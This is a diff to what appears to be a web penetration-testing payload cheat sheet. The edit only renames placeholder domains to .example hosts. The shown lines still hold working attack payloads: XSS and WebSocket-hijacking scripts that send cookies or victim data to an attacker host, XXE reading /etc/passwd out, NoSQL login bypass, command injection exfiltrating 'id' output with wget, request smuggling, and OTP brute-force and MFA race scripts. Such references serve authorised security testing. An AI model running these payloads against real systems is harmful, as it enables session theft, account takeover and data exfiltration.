@@ -24,15 +24,15 @@ javascript:alert(document.domain)
 
 ### Cookie Theft (proof of impact)
 ```javascript
-<script>document.location='https://attacker.com/c?c='+document.cookie</script>
-<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
-<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
+<script>document.location='https://attacker.example/c?c='+document.cookie</script>
+<img src=x onerror="fetch('https://attacker.example?c='+document.cookie)">
+<script>fetch('https://attacker.example?c='+btoa(document.cookie))</script>
 ```
 
 ### CSP Bypass Techniques
 ```javascript
 // If unsafe-inline blocked — use fetch/XHR
-<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
+<img src=x onerror="fetch('https://attacker.example?d='+btoa(document.cookie))">
 
 // If script-src nonce present — find nonce reflection
 <script nonce="NONCE_FROM_PAGE">alert(1)</script>
@@ -195,7 +195,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 <?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % data SYSTEM "file:///etc/passwd">
-  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
+  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.example/?%data;'>">
   %param1;
 ]>
 <foo>&exfil;</foo>
@@ -314,7 +314,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 
 ### Auth Bypass One-Liners
 ```bash
-curl -s -X POST https://target.com/api/login \
+curl -s -X POST https://target.example/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":{"$ne":null},"password":{"$ne":null}}'
 
@@ -346,7 +346,7 @@ $(sleep 5)
 ; nslookup attacker.burpcollaborator.net
 $(nslookup attacker.burpcollaborator.net)
 `ping -c 1 attacker.burpcollaborator.net`
-; wget https://attacker.com/$(id|base64)
+; wget https://attacker.example/$(id|base64)
 ```
 
 ### Bypass Techniques
@@ -370,7 +370,7 @@ $(nslookup attacker.burpcollaborator.net)
 # Windows-specific
 & dir
 | type C:\Windows\win.ini
-& ping -n 1 attacker.com
+& ping -n 1 attacker.example
 ```
 
 ### Context-Specific (filename injection)
@@ -451,7 +451,7 @@ HTTP headers that appear in rendered responses, notification templates
 ### CL.TE — Content-Length front-end, Transfer-Encoding back-end
 ```http
 POST / HTTP/1.1
-Host: target.com
+Host: target.example
 Content-Length: 13
 Transfer-Encoding: chunked
 
@@ -463,7 +463,7 @@ SMUGGLED
 ### TE.CL — Transfer-Encoding front-end, Content-Length back-end
 ```http
 POST / HTTP/1.1
-Host: target.com
+Host: target.example
 Transfer-Encoding: chunked
 Content-Length: 3
 
@@ -530,25 +530,25 @@ Basic desync          → Capture victim's next request → Read their auth toke
 ```html
 <!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
 <script>
-var ws = new WebSocket('wss://target.com/ws');
+var ws = new WebSocket('wss://target.example/ws');
 // Browser automatically sends victim's cookies
 ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
-ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
+ws.onmessage = (e) => fetch('https://attacker.example/?d='+encodeURIComponent(e.data));
 </script>
 ```
 
 ### Test Origin Validation
 ```bash
 # Should reject non-target origins. If it doesn't = CSWSH vulnerability
-wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
-wscat -c "wss://target.com/ws" -H "Origin: null"
-wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
+wscat -c "wss://target.example/ws" -H "Origin: https://evil.example"
+wscat -c "wss://target.example/ws" -H "Origin: null"
+wscat -c "wss://target.example/ws" -H "Origin: https://target.example.evil.example"
 ```
 
 ### Injection via WS Messages
 ```javascript
 // XSS in chat/notification system
-{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}
+{"message": "<img src=x onerror=fetch('https://attacker.example?c='+document.cookie)>"}
 
 // SQLi
 {"action": "search", "query": "' OR 1=1--"}
@@ -564,7 +564,7 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 ### Pattern 1: OTP Brute Force (no rate limit)
 ```bash
 # Try all 6-digit OTPs
-ffuf -u "https://target.com/api/verify-otp" \
+ffuf -u "https://target.example/api/verify-otp" \
   -X POST \
   -H "Content-Type: application/json" \
   -H "Cookie: session=YOUR_SESSION" \
@@ -602,7 +602,7 @@ import requests, time
 # Some implementations use timestamp-based OTPs:
 for t_offset in range(-30, 31):  # Test ±30 seconds
     totp_value = generate_totp(secret, time.time() + t_offset)
-    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
+    r = requests.post("https://target.example/api/mfa", json={"otp": totp_value})
     if r.status_code == 200:
         print(f"VALID at offset {t_offset}s: {totp_value}")
         break
@@ -631,7 +631,7 @@ import asyncio, aiohttp
 # Race 2 MFA verifications simultaneously
 # If both succeed = parallel session ATO
 async def verify(session, otp):
-    async with session.post("https://target.com/api/mfa/verify",
+    async with session.post("https://target.example/api/mfa/verify",
                             json={"otp": otp}) as r:
         return await r.json()
 
